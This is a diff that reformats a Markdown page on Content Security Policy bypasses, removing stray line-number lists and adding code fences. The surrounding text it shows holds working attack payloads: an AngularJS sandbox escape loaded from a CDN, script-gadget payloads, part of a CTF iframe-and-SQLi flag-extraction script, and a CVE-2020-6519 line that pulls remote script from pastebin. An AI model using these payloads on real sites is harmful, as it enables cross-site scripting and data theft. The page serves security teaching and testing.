@@ -18,15 +18,7 @@ Content-Security-Policy-Report-OnlyThis one won’t block anything, only send re
 Defining resources
 CSP works by restricting the origins that active and passive content can be loaded from. It can additionally restrict certain aspects of active content such as the execution of inline javascript, and the use of eval().
 
-1
-2
-3
-4
-5
-6
-7
-8
-9
+```
 default-src 'none';
 img-src 'self';
 script-src 'self' https://code.jquery.com;
@@ -36,6 +28,8 @@ font-src 'self' https://addons.cdn.mozilla.net;
 frame-src 'self' https://ic.paypal.com https://paypal.com;
 media-src https://videos.cdn.mozilla.net;
 object-src 'none';
+```
+
 Directives
 script-src: This directive specifies allowed sources for JavaScript. This includes not only URLs loaded directly into elements, but also things like inline script event handlers (onclick) and XSLT stylesheets which can trigger script execution.
 default-src: This directive defines the policy for fetching resources by default. When fetch directives are absent in CSP header the browser follows this directive by default.
@@ -118,17 +112,8 @@ Load a vulnerable version of angular and execute arbitrary JS:
 <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
 <div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//');}} </div>
 Other payloads:
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
+
+
 <script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
   
 <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
@@ -217,62 +202,9 @@ This time you can make the victim load a page in your control via XSS with a <if
 
 This time a flag is going to be extracted, whenever a char is correctly guessed via SQLi the response takes more time due to the sleep function. Then, you will be able to extract the flag:
 
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
-19
-20
-21
-22
-23
-24
-25
-26
-27
-28
-29
-30
-31
-32
-33
-34
-35
-36
-37
-38
-39
-40
-41
-42
-43
-44
-45
-46
-47
-48
-49
-50
-51
-52
-53
-54
-55
-56
+```
+
+
 <iframe name=f id=g></iframe> // The bot will load an URL with the payload
 <script>
 let host = "http://x-oracle-v1.nn9ed.ka0labs.org";
@@ -329,6 +261,8 @@ async function run() {
  
 run();
 </script>
+```
+
 CVE-2020-6519
 1
 document.querySelector('DIV').innerHTML="<iframe src='javascript:var s = document.createElement(\"script\");s.src = \"https://pastebin.com/raw/dw5cWGK6\";document.body.appendChild(s);'></iframe>";
